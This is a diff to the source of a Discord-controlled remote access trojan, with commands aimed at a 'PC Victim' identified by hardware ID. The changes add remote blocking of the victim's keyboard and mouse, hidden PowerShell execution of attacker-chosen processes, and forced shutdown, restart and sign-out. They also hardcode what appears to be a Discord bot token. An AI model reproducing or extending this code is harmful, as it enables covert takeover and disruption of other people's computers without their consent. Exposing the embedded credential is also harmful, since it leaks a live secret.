@@ -3,10 +3,11 @@ import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
-from core.destroy_window import DestroyWindow
 from discord.ext import commands
 from urllib.parse import urlparse
+from pynput import keyboard, mouse
 from pretty_help import PrettyHelp
+from core.destroy_window import DestroyWindow
 
 os.system('cls')
 pc = Info()
@@ -41,6 +42,17 @@ class Destroy(commands.Cog, description='Destory PC Victim'):
 			return
 
 class Control(commands.Cog, description='Control PC Victim'):
+
+	def __init__(self):
+		self.keyboard_listener = keyboard.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)
+		self.mouse_listener = mouse.Listener(suppress=True, on_press=self.on_press, on_release=self.on_release)
+
+	def on_press(self, key):
+		pass
+
+	def on_release(self, key):
+		pass
+
 	@commands.command(aliases=['reg'], brief='Control Registry', description='Control Registry')
 	async def Registry(self, ctx, HWID: str, method: str, path: str, ):
 		if not CheckHWID(HWID):
@@ -154,19 +166,42 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Shutdown(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /f /t 0'))
+		output = str(subprocess.check_output('shutdown /f /t 0', shell=True), 'utf-8')
 
 	@commands.command(aliases=["restart", "rstart"], brief='Restart PC Victim', description='Restart PC Victim')
 	async def Restart(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /f /r /t 0'))
+		output = str(subprocess.check_output('shutdown /f /r /t 0', shell=True), 'utf-8')
 
 	@commands.command(aliases=["signout", "sout"], brief='Sign Out PC Victim', description='Logout PC Victim')
 	async def SignOut(self, ctx, HWID: str):
 		if not CheckHWID(HWID):
 			return
-		output = str(subprocess.check_output('shutdown /l'))
+		output = str(subprocess.check_output('shutdown /l', shell=True), 'utf-8')
+
+	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
+	async def BlockInput(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+
+		kb_th = threading.Thread(target = self.keyboard_listener.start)
+		ms_th = threading.Thread(target = self.mouse_listener.start)
+		kb_th.start()
+		ms_th.start()
+		kb_th.join()
+		ms_th.join()
+		await SendOutput(ctx, 'Input has been blocked!')
+
+	@commands.command(aliases=["unblockinput", "ubinput"], brief='Unblock Keyboard and Mouse', description='Unblock Keyboard and Mouse')
+	async def UnblockInput(self, ctx, HWID: str):
+		if not CheckHWID(HWID):
+			return
+
+		self.keyboard_listener.stop()
+		self.mouse_listener.stop()
+
+		await SendOutput(ctx, 'Input has been unblocked!')
 
 	@commands.command(aliases=["kboard", "kb"], brief='Control Keyboard PC Victim', description='Control Keyboard PC Victim')
 	async def Keyboard(self, ctx, HWID: str, mode: str = 'type',  *, text = ''):
@@ -177,6 +212,15 @@ class Control(commands.Cog, description='Control PC Victim'):
 	async def Mouse(self, ctx, HWID: str, click_mode: str = 'r',  x = 0, y = 0):
 		if not CheckHWID(HWID):
 			return
+
+	@commands.command(aliases=["sprocess", "sp"], brief='Start Process in PC Victim', description='Start Process in PC Victim')
+	async def StartProcess(self, ctx, HWID: str, process = None, *, agruments):
+		if not CheckHWID(HWID):
+			return
+		if process == None:
+			return
+		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
+		await SendOutput(ctx, output)
 
 class OtherCommands(commands.Cog, description='Other Commands'):
 	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
@@ -206,3 +250,5 @@ async def on_ready():
 	await client.add_cog(Destroy())
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
+
+client.run('MTEyODk0MTcwMzAzNDgzNDk2NA.G_HZmw.klPl10GGVyzCyAwrRR96K48zjWil61j2wG7HmQ')
